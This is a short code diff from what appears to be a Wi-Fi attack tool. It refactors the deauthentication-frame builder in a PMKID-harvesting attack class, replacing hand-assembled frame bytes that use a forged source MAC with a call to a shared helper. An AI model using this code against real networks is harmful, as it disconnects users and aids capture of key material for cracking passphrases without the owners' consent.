@@ -28,11 +28,11 @@ import asyncio
 import enum
 import logging
 import os
-import struct
 import time
 from typing import Optional
 
 from wifit3.engine.models import AccessPoint
+from wifit3.wlan.interface import build_deauth
 
 from .campaign import Campaign
 from .auth_assoc import Association
@@ -204,18 +204,9 @@ class PmkidHarvestAttack(Campaign):
     # ---- Frame builders -----------------------------------------------------
 
     def _build_deauth(self) -> bytes:
-        """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to
-        the AP. Addr1=BSSID (dest), Addr2=us, Addr3=BSSID."""
-        # FC: type=mgmt(0), subtype=deauth(0x0C) → 0xC0
-        mac_hdr = (
-            b"\xc0\x00"
-            + b"\x00\x00"
-            + self.bssid_bytes
-            + self.source_mac
-            + self.bssid_bytes
-            + b"\x00\x00"
-        )
-        return mac_hdr + struct.pack("<H", 3)   # reason 3 = STA leaving
+        """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to the AP —
+        Addr1=BSSID (dest), Addr2=us, Addr3=BSSID."""
+        return build_deauth(self.bssid_bytes, self.source_mac, self.bssid_bytes, 3)
 
     # ---- Driver -------------------------------------------------------------
 
